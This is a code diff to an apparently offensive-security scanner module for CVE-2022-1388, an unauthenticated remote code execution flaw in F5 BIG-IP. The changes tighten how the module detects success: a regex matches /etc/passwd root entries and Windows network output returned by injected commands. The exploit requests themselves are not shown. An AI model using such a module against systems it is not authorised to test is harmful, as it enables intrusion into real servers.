@@ -20,6 +20,7 @@ from lib.tool.logger import logger
 from lib.tool.thread import thread
 from lib.tool import check
 from thirdparty import requests
+import re
 
 class F5_BIG_IP():
     def __init__(self):
@@ -128,10 +129,9 @@ class F5_BIG_IP():
             if (('encrypted-password' in res.text) 
                 or ('partition-access' in res.text) 
                 or (('"output": "' in res.text) and ('"error": "",' in res.text)) 
-                or ('/sbin/nologin' in res.text) 
-                or ('root:x:0:0:root' in res.text) 
-                or ('Microsoft Corp' in res.text) 
-                or ('Microsoft TCP/IP for Windows' in res.text)
+                or re.search(r'root:(x{1}|.*):\d{1,7}:\d{1,7}:root', res.text, re.I|re.M|re.S)
+                    or (('Microsoft Corp' in res.text) 
+                        and ('Microsoft TCP/IP for Windows' in res.text))
                 ):
                 results = {
                     'Target': target,
@@ -150,7 +150,8 @@ class F5_BIG_IP():
         '''
         vul_info = {}
         vul_info['app_name'] = self.app_name
-        vul_info['vul_type'] = 'unAuthorized'
+        # vul_info['vul_type'] = 'unAuthorized'
+        vul_info['vul_type'] = 'unAuth/RCE'
         vul_info['vul_id'] = 'CVE-2022-1388'
         vul_info['vul_method'] = 'POST'
         vul_info['headers'] = {
@@ -193,12 +194,12 @@ class F5_BIG_IP():
                 return None
 
             if (('commandResult' in res.text) 
-                and (('/sbin/nologin' in res.text) or ('root:x:0:0:root' in res.text))
+                and re.search(r'root:(x{1}|.*):\d{1,7}:\d{1,7}:root', res.text, re.I|re.M|re.S)
             ):
                 results = {
                     'Target': target,
                     'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
-                    'Payload': res
+                    'Request': res
                 }
                 return results
 
